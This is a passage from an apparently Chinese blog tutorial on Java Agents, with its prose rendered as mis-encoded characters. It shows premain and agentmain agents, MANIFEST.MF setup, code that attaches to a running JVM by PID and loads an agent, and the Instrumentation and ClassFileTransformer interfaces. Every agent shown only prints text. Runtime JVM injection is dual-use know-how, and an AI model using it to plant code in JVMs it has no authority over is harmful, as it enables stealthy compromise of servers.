class="string">&quot;è°ƒç”¨äº†premain-Agentï¼&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ç€åœ¨resource&#x2F;META-INF&#x2F;ä¸‹åˆ›å»ºMANIFEST.MFæ¸…å•æ–‡ä»¶ç”¨ä»¥æŒ‡å®špremain-Agentçš„å¯åŠ¨ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: <span class="number">1.0</span></span><br><span class="line">Premain-Class: com.java.premain.agent.Java_Agent_premain</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>å°†å…¶æ‰“åŒ…æˆjaræ–‡ä»¶</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1717067514381-4045842b-638b-40ea-8ebf-37cac288d151.png"><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1717067525182-1ce5a737-b3cb-462f-ba62-47a213388bcb.png"></p><p>ç„¶åç›´æ¥buildå°±å¯ä»¥äº†</p><p>åˆ›å»ºä¸€ä¸ªç›®æ ‡ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ·»åŠ JVM Optionsï¼ˆæ³¨æ„å†’å·ä¹‹åä¸èƒ½æœ‰ç©ºæ ¼ï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-javaagent:<span class="string">&quot;out/artifacts/Java_Agent_jar/Java_Agent.jar&quot;</span></span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœå¦‚ä¸‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1717067589774-a75d3cf2-f437-464d-87de-0d16e55c801f.png"></p><h4 id="agentmain-Agent"><a href="#agentmain-Agent" class="headerlink" title="agentmain-Agent"></a>agentmain-Agent</h4><p>ç›¸è¾ƒäºpremain-Agentåªèƒ½åœ¨JVMå¯åŠ¨å‰åŠ è½½ï¼Œagentmain-Agentèƒ½å¤Ÿåœ¨JVMå¯åŠ¨ä¹‹ååŠ è½½å¹¶å®ç°ç›¸åº”çš„ä¿®æ”¹å­—èŠ‚ç åŠŸèƒ½ã€‚ä¸‹é¢æˆ‘ä»¬æ¥äº†è§£ä¸€ä¸‹å’ŒJVMæœ‰å…³çš„ä¸¤ä¸ªç±»ã€‚</p><h5 id="VirtualMachineç±»"><a href="#VirtualMachineç±»" class="headerlink" title="VirtualMachineç±»"></a>VirtualMachineç±»</h5><p>com.sun.tools.attach.VirtualMachineç±»å¯ä»¥å®ç°è·å–JVMä¿¡æ¯ï¼Œå†…å­˜dumpã€ç°æˆdumpã€ç±»ä¿¡æ¯ç»Ÿè®¡ï¼ˆä¾‹å¦‚JVMåŠ è½½çš„ç±»ï¼‰ç­‰åŠŸèƒ½ã€‚</p><p>è¯¥ç±»å…è®¸æˆ‘ä»¬é€šè¿‡ç»™attachæ–¹æ³•ä¼ å…¥ä¸€ä¸ªJVMçš„PIDï¼Œæ¥è¿œç¨‹è¿æ¥åˆ°è¯¥JVMä¸Š ï¼Œä¹‹åæˆ‘ä»¬å°±å¯ä»¥å¯¹è¿æ¥çš„JVMè¿›è¡Œå„ç§æ“ä½œï¼Œå¦‚æ³¨å…¥Agentã€‚ä¸‹é¢æ˜¯è¯¥ç±»çš„ä¸»è¦æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å…è®¸æˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªJVMçš„PIDï¼Œç„¶åè¿œç¨‹è¿æ¥åˆ°è¯¥JVMä¸Š</span></span><br><span class="line">VirtualMachine.attach()</span><br><span class="line"> </span><br><span class="line"><span class="comment">//å‘JVMæ³¨å†Œä¸€ä¸ªä»£ç†ç¨‹åºagentï¼Œåœ¨è¯¥agentçš„ä»£ç†ç¨‹åºä¸­ä¼šå¾—åˆ°ä¸€ä¸ªInstrumentationå®ä¾‹ï¼Œè¯¥å®ä¾‹å¯ä»¥ åœ¨classåŠ è½½å‰æ”¹å˜classçš„å­—èŠ‚ç ï¼Œä¹Ÿå¯ä»¥åœ¨classåŠ è½½åé‡æ–°åŠ è½½ã€‚åœ¨è°ƒç”¨Instrumentationå®ä¾‹çš„æ–¹æ³•æ—¶ï¼Œè¿™äº›æ–¹æ³•ä¼šä½¿ç”¨ClassFileTransformeræ¥å£ä¸­æä¾›çš„æ–¹æ³•è¿›è¡Œå¤„ç†</span></span><br><span class="line">VirtualMachine.loadAgent()</span><br><span class="line"> </span><br><span class="line"><span class="comment">//è·å¾—å½“å‰æ‰€æœ‰çš„JVMåˆ—è¡¨</span></span><br><span class="line">VirtualMachine.list()</span><br><span class="line"> </span><br><span class="line"><span class="comment">//è§£é™¤ä¸ç‰¹å®šJVMçš„è¿æ¥</span></span><br><span class="line">VirtualMachine.detach()</span><br></pre></td></tr></table></figure><h5 id="VirtualMachineDescriptorç±»"><a href="#VirtualMachineDescriptorç±»" class="headerlink" title="VirtualMachineDescriptorç±»"></a>VirtualMachineDescriptorç±»</h5><p>com.sun.tools.attach.VirtualMachineDescriptorç±»æ˜¯ä¸€ä¸ªç”¨æ¥æè¿°ç‰¹å®šè™šæ‹Ÿæœºçš„ç±»ï¼Œå…¶æ–¹æ³•å¯ä»¥è·å–è™šæ‹Ÿæœºçš„å„ç§ä¿¡æ¯å¦‚PIDã€è™šæ‹Ÿæœºåç§°ç­‰ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªè·å–ç‰¹å®šè™šæ‹ŸæœºPIDçš„ç¤ºä¾‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachine;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">get_PID</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//è°ƒç”¨VirtualMachine.list()è·å–æ­£åœ¨è¿è¡Œçš„JVMåˆ—è¡¨</span></span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();</span><br><span class="line">        <span class="keyword">for</span>(VirtualMachineDescriptor vmd : list)&#123;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">//éå†æ¯ä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„JVMï¼Œå¦‚æœJVMåç§°ä¸ºget_PIDåˆ™è¿”å›å…¶PID</span></span><br><span class="line">            <span class="keyword">if</span>(vmd.displayName().equals(<span class="string">&quot;get_PID&quot;</span>))</span><br><span class="line">            System.out.println(vmd.id());</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">##</span><br><span class="line"><span class="number">4908</span></span><br><span class="line"> </span><br><span class="line">Process finished with exit code <span class="number">0</span></span><br></pre></td></tr></table></figure><p>ä¸‹é¢æˆ‘ä»¬å°±æ¥å®ç°ä¸€ä¸ªagentmain-Agentã€‚é¦–å…ˆæˆ‘ä»¬ç¼–å†™ä¸€ä¸ªHelloç±»ï¼Œæ¨¡æ‹Ÿæ­£åœ¨è¿è¡Œçš„JVM</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.lang.Thread.sleep;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">hello</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">            hello();</span><br><span class="line">            sleep(<span class="number">3000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åŒæ—¶é…ç½®MANIFEST.MFæ–‡ä»¶</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.java.agentmain.agent;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.lang.Thread.sleep;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Java_Agent_agentmain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String args, Instrumentation inst)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;è°ƒç”¨äº†agentmain-Agent!&quot;</span>);</span><br><span class="line">            sleep(<span class="number">3000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒæ—¶é…ç½®MANIFEST.MFæ–‡ä»¶</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: <span class="number">1.0</span></span><br><span class="line">Agent-Class: com.java.agentmain.agent.Java_Agent_agentmain</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>ç¼–è¯‘æ‰“åŒ…æˆjaræ–‡ä»¶out&#x2F;artifacts&#x2F;Java_Agent_jar&#x2F;Java_Agent.jar</p><p>æœ€åç¼–å†™ä¸€ä¸ªInject_Agentç±»ï¼Œè·å–ç‰¹å®šJVMçš„PIDå¹¶æ³¨å…¥Agent</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.java.inject;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.*;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Inject_Agent</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException &#123;</span><br><span class="line">        <span class="comment">//è°ƒç”¨VirtualMachine.list()è·å–æ­£åœ¨è¿è¡Œçš„JVMåˆ—è¡¨</span></span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();</span><br><span class="line">        <span class="keyword">for</span>(VirtualMachineDescriptor vmd : list)&#123;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//éå†æ¯ä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„JVMï¼Œå¦‚æœJVMåç§°ä¸ºSleep_Helloåˆ™è¿æ¥è¯¥JVMå¹¶åŠ è½½ç‰¹å®šAgent</span></span><br><span class="line">            <span class="keyword">if</span>(vmd.displayName().equals(<span class="string">&quot;Sleep_Hello&quot;</span>))&#123;</span><br><span class="line"> </span><br><span class="line">                <span class="comment">//è¿æ¥æŒ‡å®šJVM</span></span><br><span class="line">                <span class="type">VirtualMachine</span> <span class="variable">virtualMachine</span> <span class="operator">=</span> VirtualMachine.attach(vmd.id());</span><br><span class="line">                <span class="comment">//åŠ è½½Agent</span></span><br><span class="line">                virtualMachine.loadAgent(<span class="string">&quot;out/artifacts/Java_Agent_jar/Java_Agent.jar&quot;</span>);</span><br><span class="line">                <span class="comment">//æ–­å¼€JVMè¿æ¥</span></span><br><span class="line">                virtualMachine.detach();</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1717067723017-18de439f-c450-4b2c-8958-9db93b21ac2a.png"></p><h4 id="Instrumentation"><a href="#Instrumentation" class="headerlink" title="Instrumentation"></a>Instrumentation</h4><p>Instrumentationæ˜¯ JVMTIAgentï¼ˆJVM Tool Interface Agentï¼‰çš„ä¸€éƒ¨åˆ†ï¼ŒJava agenté€šè¿‡è¿™ä¸ªç±»å’Œç›®æ ‡ JVM è¿›è¡Œäº¤äº’ï¼Œä»è€Œè¾¾åˆ°ä¿®æ”¹æ•°æ®çš„æ•ˆæœã€‚</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1717067744447-044667fb-715a-499d-a6a9-7e2506ed036e.png"></p><p>å…¶åœ¨Javaä¸­æ˜¯ä¸€ä¸ªæ¥å£ï¼Œå¸¸ç”¨æ–¹æ³•å¦‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Instrumentation</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//å¢åŠ ä¸€ä¸ªClass æ–‡ä»¶çš„è½¬æ¢å™¨ï¼Œè½¬æ¢å™¨ç”¨äºæ”¹å˜ Class äºŒè¿›åˆ¶æµçš„æ•°æ®ï¼Œå‚æ•° canRetransform è®¾ç½®æ˜¯å¦å…è®¸é‡æ–°è½¬æ¢ã€‚</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">addTransformer</span><span class="params">(ClassFileTransformer transformer, <span class="type">boolean</span> canRetransform)</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//åœ¨ç±»åŠ è½½ä¹‹å‰ï¼Œé‡æ–°å®šä¹‰ Class æ–‡ä»¶ï¼ŒClassDefinition è¡¨ç¤ºå¯¹ä¸€ä¸ªç±»æ–°çš„å®šä¹‰ï¼Œå¦‚æœåœ¨ç±»åŠ è½½ä¹‹åï¼Œéœ€è¦ä½¿ç”¨ retransformClasses æ–¹æ³•é‡æ–°å®šä¹‰ã€‚addTransformeræ–¹æ³•é…ç½®ä¹‹åï¼Œåç»­çš„ç±»åŠ è½½éƒ½ä¼šè¢«Transformeræ‹¦æˆªã€‚å¯¹äºå·²ç»åŠ è½½è¿‡çš„ç±»ï¼Œå¯ä»¥æ‰§è¡ŒretransformClassesæ¥é‡æ–°è§¦å‘è¿™ä¸ªTransformerçš„æ‹¦æˆªã€‚ç±»åŠ è½½çš„å­—èŠ‚ç è¢«ä¿®æ”¹åï¼Œé™¤éå†æ¬¡è¢«retransformï¼Œå¦åˆ™ä¸ä¼šæ¢å¤ã€‚</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">addTransformer</span><span class="params">(ClassFileTransformer transformer)</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//åˆ é™¤ä¸€ä¸ªç±»è½¬æ¢å™¨</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">removeTransformer</span><span class="params">(ClassFileTransformer transformer)</span>;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="comment">//åœ¨ç±»åŠ è½½ä¹‹åï¼Œé‡æ–°å®šä¹‰ Classã€‚è¿™ä¸ªå¾ˆé‡è¦ï¼Œè¯¥æ–¹æ³•æ˜¯1.6 ä¹‹ååŠ å…¥çš„ï¼Œäº‹å®ä¸Šï¼Œè¯¥æ–¹æ³•æ˜¯ update äº†ä¸€ä¸ªç±»ã€‚</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">retransformClasses</span><span class="params">(Class&lt;?&gt;... classes)</span> <span class="keyword">throws</span> UnmodifiableClassException;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="comment">//åˆ¤æ–­ä¸€ä¸ªç±»æ˜¯å¦è¢«ä¿®æ”¹</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isModifiableClass</span><span class="params">(Class&lt;?&gt; theClass)</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// è·å–ç›®æ ‡å·²ç»åŠ è½½çš„ç±»ã€‚</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;rawtypes&quot;)</span></span><br><span class="line">    Class[] getAllLoadedClasses();</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//è·å–ä¸€ä¸ªå¯¹è±¡çš„å¤§å°</span></span><br><span class="line">    <span class="type">long</span> <span class="title function_">getObjectSize</span><span class="params">(Object objectToSize)</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="è·å–ç›®æ ‡JVMå·²åŠ è½½ç±»"><a href="#è·å–ç›®æ ‡JVMå·²åŠ è½½ç±»" class="headerlink" title="è·å–ç›®æ ‡JVMå·²åŠ è½½ç±»"></a>è·å–ç›®æ ‡JVMå·²åŠ è½½ç±»</h5><p>ä¸‹é¢æˆ‘ä»¬ç®€å•å®ç°ä¸€ä¸ªèƒ½å¤Ÿè·å–ç›®æ ‡JVMå·²åŠ è½½ç±»çš„agentmain-Agent</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.java.agentmain.instrumentation;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Java_Agent_agentmain_Instrumentation</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String args, Instrumentation inst)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        Class [] classes = inst.getAllLoadedClasses();</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span>(Class cls : classes)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;------------------------------------------&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;åŠ è½½ç±»: &quot;</span>+cls.getName());</span><br><span class="line">            System.out.println(<span class="string">&quot;æ˜¯å¦å¯è¢«ä¿®æ”¹: &quot;</span>+inst.isModifiableClass(cls));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»“æœ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Hello World!</span><br><span class="line">Hello World!</span><br><span class="line">------------------------------------------</span><br><span class="line">åŠ è½½ç±»: com.java.agentmain.instrumentation.Java_Agent_agentmain_Instrumentation</span><br><span class="line">æ˜¯å¦å¯è¢«ä¿®æ”¹: <span class="literal">true</span></span><br><span class="line">------------------------------------------</span><br><span class="line">åŠ è½½ç±»: Sleep_Hello</span><br><span class="line">æ˜¯å¦å¯è¢«ä¿®æ”¹: <span class="literal">true</span></span><br><span class="line">------------------------------------------</span><br><span class="line">åŠ è½½ç±»: com.intellij.rt.execution.application.AppMainV2$<span class="number">1</span></span><br><span class="line">æ˜¯å¦å¯è¢«ä¿®æ”¹: <span class="literal">true</span></span><br><span class="line">------------------------------------------</span><br><span class="line">åŠ è½½ç±»: com.intellij.rt.execution.application.AppMainV2</span><br><span class="line">æ˜¯å¦å¯è¢«ä¿®æ”¹: <span class="literal">true</span></span><br><span class="line">------------------------------------------</span><br><span class="line">åŠ è½½ç±»: com.intellij.rt.execution.application.AppMainV2$Agent</span><br><span class="line">æ˜¯å¦å¯è¢«ä¿®æ”¹: <span class="literal">true</span></span><br><span class="line"> </span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>ClassFileTransformeræ¥å£ä¸­åªæœ‰ä¸€ä¸ªtransform()æ–¹æ³•ï¼Œè¿”å›å€¼ä¸ºå­—èŠ‚æ•°ç»„ï¼Œä½œä¸ºè½¬æ¢åçš„å­—èŠ‚ç æ³¨å…¥åˆ°ç›®æ ‡JVMä¸­ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * ç±»æ–‡ä»¶è½¬æ¢æ–¹æ³•ï¼Œé‡å†™transformæ–¹æ³•å¯è·å–åˆ°å¾…åŠ è½½çš„ç±»ç›¸å…³ä¿¡æ¯</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> loader              å®šä¹‰è¦è½¬æ¢çš„ç±»åŠ è½½å™¨ï¼›å¦‚æœæ˜¯å¼•å¯¼åŠ è½½å™¨å¦‚Bootstrap ClassLoaderï¼Œåˆ™ä¸º null</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> className           å®Œå…¨é™å®šç±»å†…éƒ¨å½¢å¼çš„ç±»åç§°,æ ¼å¼å¦‚:java/lang/Runtime</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> classBeingRedefined å¦‚æœæ˜¯è¢«é‡å®šä¹‰æˆ–é‡è½¬æ¢è§¦å‘ï¼Œåˆ™ä¸ºé‡å®šä¹‰æˆ–é‡è½¬æ¢çš„ç±»ï¼›å¦‚æœæ˜¯ç±»åŠ è½½ï¼Œåˆ™ä¸º null</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> protectionDomain    è¦å®šä¹‰æˆ–é‡å®šä¹‰çš„ç±»çš„ä¿æŠ¤åŸŸ</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> classfileBuffer     ç±»æ–‡ä»¶æ ¼å¼çš„è¾“å…¥å­—èŠ‚ç¼“å†²åŒºï¼ˆä¸å¾—ä¿®æ”¹ï¼‰</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> è¿”å›ä¸€ä¸ªé€šè¿‡ASMä¿®æ”¹åæ·»åŠ äº†é˜²å¾¡ä»£ç çš„å­—èŠ‚ç byteæ•°ç»„ã€‚</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    </span><br><span class="line">    <span class="type">byte</span>[] transform(  ClassLoader         loader,</span><br><span class="line">                String              className,</span><br><span class="line">                Class&lt;?&gt;            classBeingRedefined,</span><br><span class="line">                ProtectionDomain    protectionDomain,</span><br><span class="line">                <span class="type">byte</span>[]              classfileBuffer)</span><br><span class="line">        <span class="keyword">throws</span> IllegalClassFormatException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨é€šè¿‡ addTransformer æ³¨å†Œä¸€ä¸ªtransformeråï¼Œæ¯æ¬¡å®šä¹‰æˆ–è€…é‡å®šä¹‰æ–°ç±»éƒ½ä¼šè°ƒç”¨transformerã€‚æ‰€è°“å®šä¹‰ï¼Œå³æ˜¯é€šè¿‡ClassLoader.defineClassåŠ è½½è¿›æ¥çš„ç±»ã€‚è€Œé‡å®šä¹‰æ˜¯é€šè¿‡Instrumentation.redefineClassesæ–¹æ³•é‡å®šä¹‰çš„ç±»ã€‚</p><p>å½“å­˜åœ¨å¤šä¸ªè½¬æ¢å™¨æ—¶ï¼Œè½¬æ¢å°†ç”± transform è°ƒç”¨é“¾ç»„æˆã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸€ä¸ª transform è°ƒç”¨è¿”å›çš„ byte æ•°ç»„å°†æˆä¸ºä¸‹ä¸€ä¸ªè°ƒç”¨çš„è¾“å…¥ï¼ˆé€šè¿‡ classfileBuffer å‚æ•°ï¼‰ã€‚</p><p>è½¬æ¢å°†æŒ‰ä»¥ä¸‹é¡ºåºåº”ç”¨ï¼š</p><ul><li>ä¸å¯é‡è½¬æ¢è½¬æ¢å™¨</li><li>ä¸å¯é‡è½¬æ¢æœ¬æœºè½¬æ¢å™¨</li><li>å¯é‡è½¬æ¢è½¬æ¢å™¨</li><li>å¯é‡è½¬æ¢æœ¬æœºè½¬æ¢å™¨</li></ul><p>è‡³äºtransformerä¸­å¯¹å­—èŠ‚ç çš„å…·ä½“æ“ä½œï¼Œåˆ™éœ€è¦ä½¿ç”¨åˆ°Javassisitç±»ã€‚åœ¨<a 